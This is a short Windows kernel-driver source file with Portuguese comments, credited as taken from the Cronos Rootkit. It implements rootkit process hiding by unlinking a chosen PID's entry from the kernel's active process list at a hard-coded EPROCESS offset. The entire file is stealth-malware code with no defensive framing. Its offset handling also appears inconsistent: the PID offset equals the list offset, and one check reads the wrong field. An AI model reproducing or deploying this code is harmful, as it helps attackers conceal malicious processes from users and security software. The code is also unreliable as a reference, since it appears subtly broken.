
/*

	Código obtido aqui: https://github.com/XaFF-XaFF/Cronos-Rootkit/blob/master/Cronos%20Rootkit/Ghost.cpp

*/

// Usado para ocultar processos
#define ACTIVE_PROCESS_LINKS 0x448

/// <summary>
/// Remover links
/// </summary>
/// <param name="Atual"></param>
VOID RemoverLinks(_In_ PLIST_ENTRY Atual)
{
	PLIST_ENTRY Anterior, Proxima;

	Anterior = (Atual->Blink);
	Proxima = (Atual->Flink);

	// Loop sobre si mesmo (conectar o anterior com o próximo)
	Anterior->Flink = Proxima;
	Proxima->Blink = Anterior;

	// Reescrever o LIST_ENTRY atual para apontar para si mesmo (evitando BSOD)
	Atual->Blink = (PLIST_ENTRY)&Atual->Flink;
	Atual->Flink = (PLIST_ENTRY)&Atual->Flink;
}

/// <summary>
/// Oculta um processo
/// </summary>
/// <param name="pid"></param>
/// <returns></returns>
NTSTATUS OcultarProcesso(_In_ UINT32 pid)
{
	// PID
	ULONG PidDeslocado = ACTIVE_PROCESS_LINKS;

	// Lista
	ULONG ListaDeslocada = PidDeslocado;

	// Verificando a arquitetura usando o tamanho do ponteiro
	INT_PTR ptr;

	// Ptr tamanho 8 se compilado para uma máquina de 64 bits, 4 se compilado para uma máquina de 32 bits
	ListaDeslocada += sizeof(ptr);

	// Processo atual
	PEPROCESS ProcessoAtual = PsGetCurrentProcess();

	// Lista atual
	PLIST_ENTRY ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + ListaDeslocada);

	// PID Atual
	PUINT32 PidAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + ListaDeslocada);

	// Se o PID atual for igual o PID que foi informado
	if (*(UINT32*)PidAtual == pid) {

		// Remova os links
		RemoverLinks(ListaAtual);
		return STATUS_UNSUCCESSFUL;
	}

	// Iniciar processo
	PEPROCESS IniciarProcesso = ProcessoAtual;

	// Configure as váriaveis
	ProcessoAtual = (PEPROCESS)((ULONG_PTR)ListaAtual->Flink - ListaDeslocada);
	PidAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PidDeslocado);
	ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + ListaDeslocada);

	// Repetição até o processo iniciado ser diferente do atual
	while ((ULONG_PTR)IniciarProcesso != (ULONG_PTR)ProcessoAtual)
	{
		// Verificando novamente
		if (*(UINT32*)PidAtual == pid) {

			// Remova os links
			RemoverLinks(ListaAtual);

			// Retorne sucesso
			return STATUS_SUCCESS;
		}

		// Modifique a lista para ocultar o processo
		ProcessoAtual = (PEPROCESS)((ULONG_PTR)ListaAtual->Flink - ListaDeslocada);
		PidAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PidDeslocado);
		ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + ListaDeslocada);
	}

	// Sucesso
	return STATUS_SUCCESS;
}



